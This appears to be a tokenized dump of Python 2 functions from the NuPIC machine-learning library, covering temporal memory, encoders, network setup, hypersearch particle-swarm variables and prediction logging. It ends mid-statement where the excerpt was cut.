def _getTPClass ( temporalImp ) : if temporalImp == 'py' : return backtracking_tm . BacktrackingTM elif temporalImp == 'cpp' : return backtracking_tm_cpp . BacktrackingTMCPP elif temporalImp == 'tm_py' : return backtracking_tm_shim . TMShim elif temporalImp == 'tm_cpp' : return backtracking_tm_shim . TMCPPShim elif temporalImp == 'monitored_tm_py' : return backtracking_tm_shim . MonitoredTMShim else : raise RuntimeError ( "Invalid temporalImp '%s'. Legal values are: 'py', " "'cpp', 'tm_py', 'monitored_tm_py'" % ( temporalImp ) )
def _compute ( self , inputs , outputs ) : #if self.topDownMode and (not 'topDownIn' in inputs): # raise RuntimeError("The input topDownIn must be linked in if " #                    "topDownMode is True") if self . _tfdr is None : raise RuntimeError ( "TM has not been initialized" ) # Conditional compute break self . _conditionalBreak ( ) self . _iterations += 1 # Get our inputs as numpy array buInputVector = inputs [ 'bottomUpIn' ] # Handle reset signal resetSignal = False if 'resetIn' in inputs : assert len ( inputs [ 'resetIn' ] ) == 1 if inputs [ 'resetIn' ] [ 0 ] != 0 : self . _tfdr . reset ( ) self . _sequencePos = 0 # Position within the current sequence if self . computePredictedActiveCellIndices : prevPredictedState = self . _tfdr . getPredictedState ( ) . reshape ( - 1 ) . astype ( 'float32' ) if self . anomalyMode : prevPredictedColumns = self . _tfdr . topDownCompute ( ) . copy ( ) . nonzero ( ) [ 0 ] # Perform inference and/or learning tpOutput = self . _tfdr . compute ( buInputVector , self . learningMode , self . inferenceMode ) self . _sequencePos += 1 # OR'ing together the cells in each column? if self . orColumnOutputs : tpOutput = tpOutput . reshape ( self . columnCount , self . cellsPerColumn ) . max ( axis = 1 ) # Direct logging of non-zero TM outputs if self . _fpLogTPOutput : output = tpOutput . reshape ( - 1 ) outputNZ = tpOutput . nonzero ( ) [ 0 ] outStr = " " . join ( [ "%d" % int ( token ) for token in outputNZ ] ) print >> self . _fpLogTPOutput , output . size , outStr # Write the bottom up out to our node outputs outputs [ 'bottomUpOut' ] [ : ] = tpOutput . flat if self . topDownMode : # Top-down compute outputs [ 'topDownOut' ] [ : ] = self . _tfdr . topDownCompute ( ) . copy ( ) # Set output for use with anomaly classification region if in anomalyMode if self . anomalyMode : activeLearnCells = self . _tfdr . getLearnActiveStateT ( ) size = activeLearnCells . shape [ 0 ] * activeLearnCells . shape [ 1 ] outputs [ 'lrnActiveStateT' ] [ : ] = activeLearnCells . reshape ( size ) activeColumns = buInputVector . nonzero ( ) [ 0 ] outputs [ 'anomalyScore' ] [ : ] = anomaly . computeRawAnomalyScore ( activeColumns , prevPredictedColumns ) if self . computePredictedActiveCellIndices : # Reshape so we are dealing with 1D arrays activeState = self . _tfdr . _getActiveState ( ) . reshape ( - 1 ) . astype ( 'float32' ) activeIndices = numpy . where ( activeState != 0 ) [ 0 ] predictedIndices = numpy . where ( prevPredictedState != 0 ) [ 0 ] predictedActiveIndices = numpy . intersect1d ( activeIndices , predictedIndices ) outputs [ "activeCells" ] . fill ( 0 ) outputs [ "activeCells" ] [ activeIndices ] = 1 outputs [ "predictedActiveCells" ] . fill ( 0 ) outputs [ "predictedActiveCells" ] [ predictedActiveIndices ] = 1
def getVersion ( ) : with open ( os . path . join ( REPO_DIR , "VERSION" ) , "r" ) as versionFile : return versionFile . read ( ) . strip ( )
def _generateExtraMetricSpecs ( options ) : _metricSpecSchema = { 'properties' : { } } results = [ ] for metric in options [ 'metrics' ] : for propertyName in _metricSpecSchema [ 'properties' ] . keys ( ) : _getPropertyValue ( _metricSpecSchema , propertyName , metric ) specString , label = _generateMetricSpecString ( field = metric [ 'field' ] , metric = metric [ 'metric' ] , params = metric [ 'params' ] , inferenceElement = metric [ 'inferenceElement' ] , returnLabel = True ) if metric [ 'logged' ] : options [ 'loggedMetrics' ] . append ( label ) results . append ( specString ) return results
def _hashCoordinate ( coordinate ) : coordinateStr = "," . join ( str ( v ) for v in coordinate ) # Compute the hash and convert to 64 bit int. hash = int ( int ( hashlib . md5 ( coordinateStr ) . hexdigest ( ) , 16 ) % ( 2 ** 64 ) ) return hash
def sameTMParams ( tp1 , tp2 ) : result = True for param in [ "numberOfCols" , "cellsPerColumn" , "initialPerm" , "connectedPerm" , "minThreshold" , "newSynapseCount" , "permanenceInc" , "permanenceDec" , "permanenceMax" , "globalDecay" , "activationThreshold" , "doPooling" , "segUpdateValidDuration" , "burnIn" , "pamLength" , "maxAge" ] : if getattr ( tp1 , param ) != getattr ( tp2 , param ) : print param , "is different" print getattr ( tp1 , param ) , "vs" , getattr ( tp2 , param ) result = False return result
def sameSegment ( seg1 , seg2 ) : result = True # check sequence segment, total activations etc. In case any are floats, # check that they are within 0.001. for field in [ 1 , 2 , 3 , 4 , 5 , 6 ] : if abs ( seg1 [ 0 ] [ field ] - seg2 [ 0 ] [ field ] ) > 0.001 : result = False # Compare number of synapses if len ( seg1 [ 1 : ] ) != len ( seg2 [ 1 : ] ) : result = False # Now compare synapses, ignoring order of synapses for syn in seg2 [ 1 : ] : if syn [ 2 ] <= 0 : print "A synapse with zero permanence encountered" result = False if result == True : for syn in seg1 [ 1 : ] : if syn [ 2 ] <= 0 : print "A synapse with zero permanence encountered" result = False res = sameSynapse ( syn , seg2 [ 1 : ] ) if res == False : result = False return result
def logProbability ( self , distn ) : x = numpy . asarray ( distn ) n = x . sum ( ) return ( logFactorial ( n ) - numpy . sum ( [ logFactorial ( k ) for k in x ] ) + numpy . sum ( x * numpy . log ( self . dist . pmf ) ) )
def createDataOutLink ( network , sensorRegionName , regionName ) : network . link ( sensorRegionName , regionName , "UniformLink" , "" , srcOutput = "dataOut" , destInput = "bottomUpIn" )
def createSensorToClassifierLinks ( network , sensorRegionName , classifierRegionName ) : network . link ( sensorRegionName , classifierRegionName , "UniformLink" , "" , srcOutput = "bucketIdxOut" , destInput = "bucketIdxIn" ) network . link ( sensorRegionName , classifierRegionName , "UniformLink" , "" , srcOutput = "actValueOut" , destInput = "actValueIn" ) network . link ( sensorRegionName , classifierRegionName , "UniformLink" , "" , srcOutput = "categoryOut" , destInput = "categoryIn" )
def createNetwork ( dataSource ) : with open ( _PARAMS_PATH , "r" ) as f : modelParams = yaml . safe_load ( f ) [ "modelParams" ] # Create a network that will hold the regions. network = Network ( ) # Add a sensor region. network . addRegion ( "sensor" , "py.RecordSensor" , '{}' ) # Set the encoder and data source of the sensor region. sensorRegion = network . regions [ "sensor" ] . getSelf ( ) sensorRegion . encoder = createEncoder ( modelParams [ "sensorParams" ] [ "encoders" ] ) sensorRegion . dataSource = dataSource # Make sure the SP input width matches the sensor region output width. modelParams [ "spParams" ] [ "inputWidth" ] = sensorRegion . encoder . getWidth ( ) # Add SP and TM regions. network . addRegion ( "SP" , "py.SPRegion" , json . dumps ( modelParams [ "spParams" ] ) ) network . addRegion ( "TM" , "py.TMRegion" , json . dumps ( modelParams [ "tmParams" ] ) ) # Add a classifier region. clName = "py.%s" % modelParams [ "clParams" ] . pop ( "regionName" ) network . addRegion ( "classifier" , clName , json . dumps ( modelParams [ "clParams" ] ) ) # Add all links createSensorToClassifierLinks ( network , "sensor" , "classifier" ) createDataOutLink ( network , "sensor" , "SP" ) createFeedForwardLink ( network , "SP" , "TM" ) createFeedForwardLink ( network , "TM" , "classifier" ) # Reset links are optional, since the sensor region does not send resets. createResetLink ( network , "sensor" , "SP" ) createResetLink ( network , "sensor" , "TM" ) # Make sure all objects are initialized. network . initialize ( ) return network
def getPredictionResults ( network , clRegionName ) : classifierRegion = network . regions [ clRegionName ] actualValues = classifierRegion . getOutputData ( "actualValues" ) probabilities = classifierRegion . getOutputData ( "probabilities" ) steps = classifierRegion . getSelf ( ) . stepsList N = classifierRegion . getSelf ( ) . maxCategoryCount results = { step : { } for step in steps } for i in range ( len ( steps ) ) : # stepProbabilities are probabilities for this prediction step only. stepProbabilities = probabilities [ i * N : ( i + 1 ) * N - 1 ] mostLikelyCategoryIdx = stepProbabilities . argmax ( ) predictedValue = actualValues [ mostLikelyCategoryIdx ] predictionConfidence = stepProbabilities [ mostLikelyCategoryIdx ] results [ steps [ i ] ] [ "predictedValue" ] = predictedValue results [ steps [ i ] ] [ "predictionConfidence" ] = predictionConfidence return results
def runHotgym ( numRecords ) : # Create a data source for the network. dataSource = FileRecordStream ( streamID = _INPUT_FILE_PATH ) numRecords = min ( numRecords , dataSource . getDataRowCount ( ) ) network = createNetwork ( dataSource ) # Set predicted field network . regions [ "sensor" ] . setParameter ( "predictedField" , "consumption" ) # Enable learning for all regions. network . regions [ "SP" ] . setParameter ( "learningMode" , 1 ) network . regions [ "TM" ] . setParameter ( "learningMode" , 1 ) network . regions [ "classifier" ] . setParameter ( "learningMode" , 1 ) # Enable inference for all regions. network . regions [ "SP" ] . setParameter ( "inferenceMode" , 1 ) network . regions [ "TM" ] . setParameter ( "inferenceMode" , 1 ) network . regions [ "classifier" ] . setParameter ( "inferenceMode" , 1 ) results = [ ] N = 1 # Run the network, N iterations at a time. for iteration in range ( 0 , numRecords , N ) : network . run ( N ) predictionResults = getPredictionResults ( network , "classifier" ) oneStep = predictionResults [ 1 ] [ "predictedValue" ] oneStepConfidence = predictionResults [ 1 ] [ "predictionConfidence" ] fiveStep = predictionResults [ 5 ] [ "predictedValue" ] fiveStepConfidence = predictionResults [ 5 ] [ "predictionConfidence" ] result = ( oneStep , oneStepConfidence * 100 , fiveStep , fiveStepConfidence * 100 ) print "1-step: {:16} ({:4.4}%)\t 5-step: {:16} ({:4.4}%)" . format ( * result ) results . append ( result ) return results
def run ( self ) : self . _logger . debug ( "Starting Dummy Model: modelID=%s;" % ( self . _modelID ) ) # ========================================================================= # Initialize periodic activities (e.g., for model result updates) # ========================================================================= periodic = self . _initPeriodicActivities ( ) self . _optimizedMetricLabel = self . _optimizeKeyPattern self . _reportMetricLabels = [ self . _optimizeKeyPattern ] # ========================================================================= # Create our top-level loop-control iterator # ========================================================================= if self . _iterations >= 0 : iterTracker = iter ( xrange ( self . _iterations ) ) else : iterTracker = iter ( itertools . count ( ) ) # ========================================================================= # This gets set in the unit tests. It tells the worker to sys exit #  the first N models. This is how we generate orphaned models doSysExit = False if self . _sysExitModelRange is not None : modelAndCounters = self . _jobsDAO . modelsGetUpdateCounters ( self . _jobID ) modelIDs = [ x [ 0 ] for x in modelAndCounters ] modelIDs . sort ( ) ( beg , end ) = self . _sysExitModelRange if self . _modelID in modelIDs [ int ( beg ) : int ( end ) ] : doSysExit = True if self . _delayModelRange is not None : modelAndCounters = self . _jobsDAO . modelsGetUpdateCounters ( self . _jobID ) modelIDs = [ x [ 0 ] for x in modelAndCounters ] modelIDs . sort ( ) ( beg , end ) = self . _delayModelRange if self . _modelID in modelIDs [ int ( beg ) : int ( end ) ] : time . sleep ( 10 ) # DEBUG!!!! infinite wait if we have 50 models #if len(modelIDs) >= 50: #  jobCancel = self._jobsDAO.jobGetFields(self._jobID, ['cancel'])[0] #  while not jobCancel: #    time.sleep(1) #    jobCancel = self._jobsDAO.jobGetFields(self._jobID, ['cancel'])[0] if self . _errModelRange is not None : modelAndCounters = self . _jobsDAO . modelsGetUpdateCounters ( self . _jobID ) modelIDs = [ x [ 0 ] for x in modelAndCounters ] modelIDs . sort ( ) ( beg , end ) = self . _errModelRange if self . _modelID in modelIDs [ int ( beg ) : int ( end ) ] : raise RuntimeError ( "Exiting with error due to errModelRange parameter" ) # ========================================================================= # Delay, if necessary if self . _delay is not None : time . sleep ( self . _delay ) # ========================================================================= # Run it! # ========================================================================= self . _currentRecordIndex = 0 while True : # ========================================================================= # Check if the model should be stopped # ========================================================================= # If killed by a terminator, stop running if self . _isKilled : break # If job stops or hypersearch ends, stop running if self . _isCanceled : break # If model is mature, stop running ONLY IF  we are not the best model # for the job. Otherwise, keep running so we can keep returning # predictions to the user if self . _isMature : if not self . _isBestModel : self . _cmpReason = self . _jobsDAO . CMPL_REASON_STOPPED break else : self . _cmpReason = self . _jobsDAO . CMPL_REASON_EOF # ========================================================================= # Get the the next record, and "write it" # ========================================================================= try : self . _currentRecordIndex = next ( iterTracker ) except StopIteration : break # "Write" a dummy output value. This is used to test that the batched # writing works properly self . _writePrediction ( ModelResult ( None , None , None , None ) ) periodic . tick ( ) # ========================================================================= # Compute wait times. See if model should exit # ========================================================================= if self . __shouldSysExit ( self . _currentRecordIndex ) : sys . exit ( 1 ) # Simulate computation time if self . _busyWaitTime is not None : time . sleep ( self . _busyWaitTime ) self . __computeWaitTime ( ) # Asked to abort after so many iterations? if doSysExit : sys . exit ( 1 ) # Asked to raise a jobFailException? if self . _jobFailErr : raise utils . JobFailException ( "E10000" , "dummyModel's jobFailErr was True." ) # ========================================================================= # Handle final operations # ========================================================================= if self . _doFinalize : if not self . _makeCheckpoint : self . _model = None # Delay finalization operation if self . _finalDelay is not None : time . sleep ( self . _finalDelay ) self . _finalize ( ) self . _logger . info ( "Finished: modelID=%r " % ( self . _modelID ) ) return ( self . _cmpReason , None )
def getDescription ( self ) : description = { 'name' : self . name , 'fields' : [ f . name for f in self . fields ] , 'numRecords by field' : [ f . numRecords for f in self . fields ] } return description
def generateRecords ( self , records ) : if self . verbosity > 0 : print 'Generating' , len ( records ) , 'records...' for record in records : self . generateRecord ( record )
def getRecord ( self , n = None ) : if n is None : assert len ( self . fields ) > 0 n = self . fields [ 0 ] . numRecords - 1 assert ( all ( field . numRecords > n for field in self . fields ) ) record = [ field . values [ n ] for field in self . fields ] return record
def getAllRecords ( self ) : values = [ ] numRecords = self . fields [ 0 ] . numRecords assert ( all ( field . numRecords == numRecords for field in self . fields ) ) for x in range ( numRecords ) : values . append ( self . getRecord ( x ) ) return values
def addValuesToField ( self , i , numValues ) : assert ( len ( self . fields ) > i ) values = [ self . addValueToField ( i ) for n in range ( numValues ) ] return values
def getSDRforValue ( self , i , j ) : assert len ( self . fields ) > i assert self . fields [ i ] . numRecords > j encoding = self . fields [ i ] . encodings [ j ] return encoding
def getZeroedOutEncoding ( self , n ) : assert all ( field . numRecords > n for field in self . fields ) encoding = np . concatenate ( [ field . encoder . encode ( SENTINEL_VALUE_FOR_MISSING_DATA ) if field . isPredictedField else field . encodings [ n ] for field in self . fields ] ) return encoding
def getTotaln ( self ) : n = sum ( [ field . n for field in self . fields ] ) return n
def getTotalw ( self ) : w = sum ( [ field . w for field in self . fields ] ) return w
def getEncoding ( self , n ) : assert ( all ( field . numEncodings > n for field in self . fields ) ) encoding = np . concatenate ( [ field . encodings [ n ] for field in self . fields ] ) return encoding
def getAllEncodings ( self ) : numEncodings = self . fields [ 0 ] . numEncodings assert ( all ( field . numEncodings == numEncodings for field in self . fields ) ) encodings = [ self . getEncoding ( index ) for index in range ( numEncodings ) ] return encodings
def removeAllRecords ( self ) : for field in self . fields : field . encodings , field . values = [ ] , [ ] field . numRecords , field . numEncodings = ( 0 , 0 )
def encodeValue ( self , value , toBeAdded = True ) : encodedValue = np . array ( self . encoder . encode ( value ) , dtype = realDType ) if toBeAdded : self . encodings . append ( encodedValue ) self . numEncodings += 1 return encodedValue
def _setTypes ( self , encoderSpec ) : if self . encoderType is None : if self . dataType in [ 'int' , 'float' ] : self . encoderType = 'adaptiveScalar' elif self . dataType == 'string' : self . encoderType = 'category' elif self . dataType in [ 'date' , 'datetime' ] : self . encoderType = 'date' if self . dataType is None : if self . encoderType in [ 'scalar' , 'adaptiveScalar' ] : self . dataType = 'float' elif self . encoderType in [ 'category' , 'enumeration' ] : self . dataType = 'string' elif self . encoderType in [ 'date' , 'datetime' ] : self . dataType = 'datetime'
def getScalars ( self , input ) : if input == SENTINEL_VALUE_FOR_MISSING_DATA : return numpy . array ( [ None ] ) else : return numpy . array ( [ self . categoryToIndex . get ( input , 0 ) ] )
def getBucketIndices ( self , input ) : # Get the bucket index from the underlying scalar encoder if input == SENTINEL_VALUE_FOR_MISSING_DATA : return [ None ] else : return self . encoder . getBucketIndices ( self . categoryToIndex . get ( input , 0 ) )
def decode ( self , encoded , parentFieldName = '' ) : # Get the scalar values from the underlying scalar encoder ( fieldsDict , fieldNames ) = self . encoder . decode ( encoded ) if len ( fieldsDict ) == 0 : return ( fieldsDict , fieldNames ) # Expect only 1 field assert ( len ( fieldsDict ) == 1 ) # Get the list of categories the scalar values correspond to and #  generate the description from the category name(s). ( inRanges , inDesc ) = fieldsDict . values ( ) [ 0 ] outRanges = [ ] desc = "" for ( minV , maxV ) in inRanges : minV = int ( round ( minV ) ) maxV = int ( round ( maxV ) ) outRanges . append ( ( minV , maxV ) ) while minV <= maxV : if len ( desc ) > 0 : desc += ", " desc += self . indexToCategory [ minV ] minV += 1 # Return result if parentFieldName != '' : fieldName = "%s.%s" % ( parentFieldName , self . name ) else : fieldName = self . name return ( { fieldName : ( outRanges , desc ) } , [ fieldName ] )
def getBucketValues ( self ) : if self . _bucketValues is None : numBuckets = len ( self . encoder . getBucketValues ( ) ) self . _bucketValues = [ ] for bucketIndex in range ( numBuckets ) : self . _bucketValues . append ( self . getBucketInfo ( [ bucketIndex ] ) [ 0 ] . value ) return self . _bucketValues
def getBucketInfo ( self , buckets ) : # For the category encoder, the bucket index is the category index bucketInfo = self . encoder . getBucketInfo ( buckets ) [ 0 ] categoryIndex = int ( round ( bucketInfo . value ) ) category = self . indexToCategory [ categoryIndex ] return [ EncoderResult ( value = category , scalar = categoryIndex , encoding = bucketInfo . encoding ) ]
def topDownCompute ( self , encoded ) : encoderResult = self . encoder . topDownCompute ( encoded ) [ 0 ] value = encoderResult . value categoryIndex = int ( round ( value ) ) category = self . indexToCategory [ categoryIndex ] return EncoderResult ( value = category , scalar = categoryIndex , encoding = encoderResult . encoding )
def _getStreamDef ( self , modelDescription ) : #-------------------------------------------------------------------------- # Generate the string containing the aggregation settings. aggregationPeriod = { 'days' : 0 , 'hours' : 0 , 'microseconds' : 0 , 'milliseconds' : 0 , 'minutes' : 0 , 'months' : 0 , 'seconds' : 0 , 'weeks' : 0 , 'years' : 0 , } # Honor any overrides provided in the stream definition aggFunctionsDict = { } if 'aggregation' in modelDescription [ 'streamDef' ] : for key in aggregationPeriod . keys ( ) : if key in modelDescription [ 'streamDef' ] [ 'aggregation' ] : aggregationPeriod [ key ] = modelDescription [ 'streamDef' ] [ 'aggregation' ] [ key ] if 'fields' in modelDescription [ 'streamDef' ] [ 'aggregation' ] : for ( fieldName , func ) in modelDescription [ 'streamDef' ] [ 'aggregation' ] [ 'fields' ] : aggFunctionsDict [ fieldName ] = str ( func ) # Do we have any aggregation at all? hasAggregation = False for v in aggregationPeriod . values ( ) : if v != 0 : hasAggregation = True break # Convert the aggFunctionsDict to a list aggFunctionList = aggFunctionsDict . items ( ) aggregationInfo = dict ( aggregationPeriod ) aggregationInfo [ 'fields' ] = aggFunctionList streamDef = copy . deepcopy ( modelDescription [ 'streamDef' ] ) streamDef [ 'aggregation' ] = copy . deepcopy ( aggregationInfo ) return streamDef
def _engineServicesRunning ( ) : process = subprocess . Popen ( [ "ps" , "aux" ] , stdout = subprocess . PIPE ) stdout = process . communicate ( ) [ 0 ] result = process . returncode if result != 0 : raise RuntimeError ( "Unable to check for running client job manager" ) # See if the CJM is running running = False for line in stdout . split ( "\n" ) : if "python" in line and "clientjobmanager.client_job_manager" in line : running = True break return running
def getData ( self , n ) : records = [ self . getNext ( ) for x in range ( n ) ] return records
def _generate ( self ) : candidates = np . array ( range ( self . _n ) , np . uint32 ) for i in xrange ( self . _num ) : self . _random . shuffle ( candidates ) pattern = candidates [ 0 : self . _getW ( ) ] self . _patterns [ i ] = set ( pattern )
def _getW ( self ) : w = self . _w if type ( w ) is list : return w [ self . _random . getUInt32 ( len ( w ) ) ] else : return w
def _generate ( self ) : n = self . _n w = self . _w assert type ( w ) is int , "List for w not supported" for i in xrange ( n / w ) : pattern = set ( xrange ( i * w , ( i + 1 ) * w ) ) self . _patterns [ i ] = pattern
def encodeIntoArray ( self , value , output ) : denseInput = numpy . zeros ( output . shape ) try : denseInput [ value ] = 1 except IndexError : if isinstance ( value , numpy . ndarray ) : raise ValueError ( "Numpy array must have integer dtype but got {}" . format ( value . dtype ) ) raise super ( SparsePassThroughEncoder , self ) . encodeIntoArray ( denseInput , output )
def requireAnomalyModel ( func ) : @ wraps ( func ) def _decorator ( self , * args , * * kwargs ) : if not self . getInferenceType ( ) == InferenceType . TemporalAnomaly : raise RuntimeError ( "Method required a TemporalAnomaly model." ) if self . _getAnomalyClassifier ( ) is None : raise RuntimeError ( "Model does not support this command. Model must" "be an active anomalyDetector model." ) return func ( self , * args , * * kwargs ) return _decorator
def _anomalyCompute ( self ) : inferenceType = self . getInferenceType ( ) inferences = { } sp = self . _getSPRegion ( ) score = None if inferenceType == InferenceType . NontemporalAnomaly : score = sp . getOutputData ( "anomalyScore" ) [ 0 ] #TODO move from SP to Anomaly ? elif inferenceType == InferenceType . TemporalAnomaly : tm = self . _getTPRegion ( ) if sp is not None : activeColumns = sp . getOutputData ( "bottomUpOut" ) . nonzero ( ) [ 0 ] else : sensor = self . _getSensorRegion ( ) activeColumns = sensor . getOutputData ( 'dataOut' ) . nonzero ( ) [ 0 ] if not self . _predictedFieldName in self . _input : raise ValueError ( "Expected predicted field '%s' in input row, but was not found!" % self . _predictedFieldName ) # Calculate the anomaly score using the active columns # and previous predicted columns. score = tm . getOutputData ( "anomalyScore" ) [ 0 ] # Calculate the classifier's output and use the result as the anomaly # label. Stores as string of results. # TODO: make labels work with non-SP models if sp is not None : self . _getAnomalyClassifier ( ) . setParameter ( "activeColumnCount" , len ( activeColumns ) ) self . _getAnomalyClassifier ( ) . prepareInputs ( ) self . _getAnomalyClassifier ( ) . compute ( ) labels = self . _getAnomalyClassifier ( ) . getSelf ( ) . getLabelResults ( ) inferences [ InferenceElement . anomalyLabel ] = "%s" % labels inferences [ InferenceElement . anomalyScore ] = score return inferences
def _getClassifierRegion ( self ) : if ( self . _netInfo . net is not None and "Classifier" in self . _netInfo . net . regions ) : return self . _netInfo . net . regions [ "Classifier" ] else : return None
def getState ( self ) : return dict ( _position = self . _position , position = self . getPosition ( ) , velocity = self . _velocity , bestPosition = self . _bestPosition , bestResult = self . _bestResult )
def setState ( self , state ) : self . _position = state [ '_position' ] self . _velocity = state [ 'velocity' ] self . _bestPosition = state [ 'bestPosition' ] self . _bestResult = state [ 'bestResult' ]
def getPosition ( self ) : if self . stepSize is None : return self . _position # Find nearest step numSteps = ( self . _position - self . min ) / self . stepSize numSteps = int ( round ( numSteps ) ) position = self . min + ( numSteps * self . stepSize ) position = max ( self . min , position ) position = min ( self . max , position ) return position
def agitate ( self ) : # Increase velocity enough that it will be higher the next time # newPosition() is called. We know that newPosition multiplies by inertia, # so take that into account. self . _velocity *= 1.5 / self . _inertia # Clip velocity maxV = ( self . max - self . min ) / 2 if self . _velocity > maxV : self . _velocity = maxV elif self . _velocity < - maxV : self . _velocity = - maxV # if we at the max or min, reverse direction if self . _position == self . max and self . _velocity > 0 : self . _velocity *= - 1 if self . _position == self . min and self . _velocity < 0 : self . _velocity *= - 1
def newPosition ( self , globalBestPosition , rng ) : # First, update the velocity. The new velocity is given as: # v = (inertia * v)  + (cogRate * r1 * (localBest-pos)) #                    + (socRate * r2 * (globalBest-pos)) # # where r1 and r2 are random numbers between 0 and 1.0 lb = float ( Configuration . get ( "nupic.hypersearch.randomLowerBound" ) ) ub = float ( Configuration . get ( "nupic.hypersearch.randomUpperBound" ) ) self . _velocity = ( self . _velocity * self . _inertia + rng . uniform ( lb , ub ) * self . _cogRate * ( self . _bestPosition - self . getPosition ( ) ) ) if globalBestPosition is not None : self . _velocity += rng . uniform ( lb , ub ) * self . _socRate * ( globalBestPosition - self . getPosition ( ) ) # update position based on velocity self . _position += self . _velocity # Clip it self . _position = max ( self . min , self . _position ) self . _position = min ( self . max , self . _position ) # Return it return self . getPosition ( )
def pushAwayFrom ( self , otherPositions , rng ) : # If min and max are the same, nothing to do if self . max == self . min : return # How many potential other positions to evaluate? numPositions = len ( otherPositions ) * 4 if numPositions == 0 : return # Assign a weight to each potential position based on how close it is # to other particles. stepSize = float ( self . max - self . min ) / numPositions positions = numpy . arange ( self . min , self . max + stepSize , stepSize ) # Get rid of duplicates. numPositions = len ( positions ) weights = numpy . zeros ( numPositions ) # Assign a weight to each potential position, based on a gaussian falloff # from each existing variable. The weight of a variable to each potential # position is given as: #    e ^ -(dist^2/stepSize^2) maxDistanceSq = - 1 * ( stepSize ** 2 ) for pos in otherPositions : distances = pos - positions varWeights = numpy . exp ( numpy . power ( distances , 2 ) / maxDistanceSq ) weights += varWeights # Put this particle at the position with smallest weight. positionIdx = weights . argmin ( ) self . _position = positions [ positionIdx ] # Set its best position to this. self . _bestPosition = self . getPosition ( ) # Give it a random direction. self . _velocity *= rng . choice ( [ 1 , - 1 ] )
def resetVelocity ( self , rng ) : maxVelocity = ( self . max - self . min ) / 5.0 self . _velocity = maxVelocity #min(abs(self._velocity), maxVelocity) self . _velocity *= rng . choice ( [ 1 , - 1 ] )
def getPosition ( self ) : position = super ( PermuteInt , self ) . getPosition ( ) position = int ( round ( position ) ) return position
def getState ( self ) : return dict ( _position = self . getPosition ( ) , position = self . getPosition ( ) , velocity = None , bestPosition = self . choices [ self . _bestPositionIdx ] , bestResult = self . _bestResult )
def setState ( self , state ) : self . _positionIdx = self . choices . index ( state [ '_position' ] ) self . _bestPositionIdx = self . choices . index ( state [ 'bestPosition' ] ) self . _bestResult = state [ 'bestResult' ]
def newPosition ( self , globalBestPosition , rng ) : # Compute the mean score per choice. numChoices = len ( self . choices ) meanScorePerChoice = [ ] overallSum = 0 numResults = 0 for i in range ( numChoices ) : if len ( self . _resultsPerChoice [ i ] ) > 0 : data = numpy . array ( self . _resultsPerChoice [ i ] ) meanScorePerChoice . append ( data . mean ( ) ) overallSum += data . sum ( ) numResults += data . size else : meanScorePerChoice . append ( None ) if numResults == 0 : overallSum = 1.0 numResults = 1 # For any choices we don't have a result for yet, set to the overall mean. for i in range ( numChoices ) : if meanScorePerChoice [ i ] is None : meanScorePerChoice [ i ] = overallSum / numResults # Now, pick a new choice based on the above probabilities. Note that the #  best result is the lowest result. We want to make it more likely to #  pick the choice that produced the lowest results. So, we need to invert #  the scores (someLargeNumber - score). meanScorePerChoice = numpy . array ( meanScorePerChoice ) # Invert meaning. meanScorePerChoice = ( 1.1 * meanScorePerChoice . max ( ) ) - meanScorePerChoice # If you want the scores to quickly converge to the best choice, raise the # results to a power. This will cause lower scores to become lower # probability as you see more results, until it eventually should # assymptote to only choosing the best choice. if self . _fixEarly : meanScorePerChoice **= ( numResults * self . _fixEarlyFactor / numChoices ) # Normalize. total = meanScorePerChoice . sum ( ) if total == 0 : total = 1.0 meanScorePerChoice /= total # Get distribution and choose one based on those probabilities. distribution = meanScorePerChoice . cumsum ( ) r = rng . random ( ) * distribution [ - 1 ] choiceIdx = numpy . where ( r <= distribution ) [ 0 ] [ 0 ] self . _positionIdx = choiceIdx return self . getPosition ( )
def pushAwayFrom ( self , otherPositions , rng ) : # Get the count of how many in each position positions = [ self . choices . index ( x ) for x in otherPositions ] positionCounts = [ 0 ] * len ( self . choices ) for pos in positions : positionCounts [ pos ] += 1 self . _positionIdx = numpy . array ( positionCounts ) . argmin ( ) self . _bestPositionIdx = self . _positionIdx
def __openDatafile ( self , modelResult ) : # Write reset bit resetFieldMeta = FieldMetaInfo ( name = "reset" , type = FieldMetaType . integer , special = FieldMetaSpecial . reset ) self . __outputFieldsMeta . append ( resetFieldMeta ) # ----------------------------------------------------------------------- # Write each of the raw inputs that go into the encoders rawInput = modelResult . rawInput rawFields = rawInput . keys ( ) rawFields . sort ( ) for field in rawFields : if field . startswith ( '_' ) or field == 'reset' : continue value = rawInput [ field ] meta = FieldMetaInfo ( name = field , type = FieldMetaType . string , special = FieldMetaSpecial . none ) self . __outputFieldsMeta . append ( meta ) self . _rawInputNames . append ( field ) # ----------------------------------------------------------------------- # Handle each of the inference elements for inferenceElement , value in modelResult . inferences . iteritems ( ) : inferenceLabel = InferenceElement . getLabel ( inferenceElement ) # TODO: Right now we assume list inferences are associated with # The input field metadata if type ( value ) in ( list , tuple ) : # Append input and prediction field meta-info self . __outputFieldsMeta . extend ( self . __getListMetaInfo ( inferenceElement ) ) elif isinstance ( value , dict ) : self . __outputFieldsMeta . extend ( self . __getDictMetaInfo ( inferenceElement , value ) ) else : if InferenceElement . getInputElement ( inferenceElement ) : self . __outputFieldsMeta . append ( FieldMetaInfo ( name = inferenceLabel + ".actual" , type = FieldMetaType . string , special = '' ) ) self . __outputFieldsMeta . append ( FieldMetaInfo ( name = inferenceLabel , type = FieldMetaType . string , special = '' ) ) if self . __metricNames : for metricName in self . __metricNames : metricField = FieldMetaInfo ( name = metricName , type = FieldMetaType . float , special = FieldMetaSpecial . none ) self . __outputFieldsMeta . append ( metricField ) # Create the inference directory for our experiment inferenceDir = _FileUtils . createExperimentInferenceDir ( self . __experimentDir ) # Consctruct the prediction dataset file path filename = ( self . __label + "." + opf_utils . InferenceType . getLabel ( self . __inferenceType ) + ".predictionLog.csv" ) self . __datasetPath = os . path . join ( inferenceDir , filename ) # Create the output dataset print "OPENING OUTPUT FOR PREDICTION WRITER AT: %r" % self . __datasetPath print "Prediction field-meta: %r" % ( [ tuple ( i ) for i in self . __outputFieldsMeta ] , ) self . __dataset = FileRecordStream ( streamID = self . __datasetPath , write = True , fields = self . __outputFieldsMeta ) # Copy data from checkpoint cache if self . __checkpointCache is not None : self . __checkpointCache . seek ( 0 ) reader = csv . reader ( self . __checkpointCache , dialect = 'excel' ) # Skip header row try : header = reader . next ( ) except StopIteration : print "Empty record checkpoint initializer for %r" % ( self . __datasetPath , ) else : assert tuple ( self . __dataset . getFieldNames ( ) ) == tuple ( header ) , "dataset.getFieldNames(): %r; predictionCheckpointFieldNames: %r" % ( tuple ( self . __dataset . getFieldNames 